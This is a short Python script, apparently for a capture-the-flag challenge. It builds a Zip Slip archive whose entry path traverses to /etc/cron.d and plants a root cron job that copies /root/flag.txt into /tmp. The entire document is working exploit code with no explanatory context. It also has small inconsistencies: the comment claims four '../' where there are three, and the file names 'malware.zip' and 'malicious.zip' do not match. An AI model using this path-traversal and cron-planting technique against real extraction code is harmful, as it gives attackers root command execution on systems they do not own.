import zipfile

# Content for the malicious cronjob
cron_content = '* * * * * root /bin/bash -c "cat /root/flag.txt > /tmp/flag.txt"'

# Path inside the ZIP to trigger Zip Slip
zip_internal_path = '../../../etc/cron.d/crontab_job'  # 4 ../ to reach /

# Create the ZIP file
with zipfile.ZipFile('malware.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
    zipf.writestr(zip_internal_path, cron_content)

print("Created malicious.zip with file at", zip_internal_path)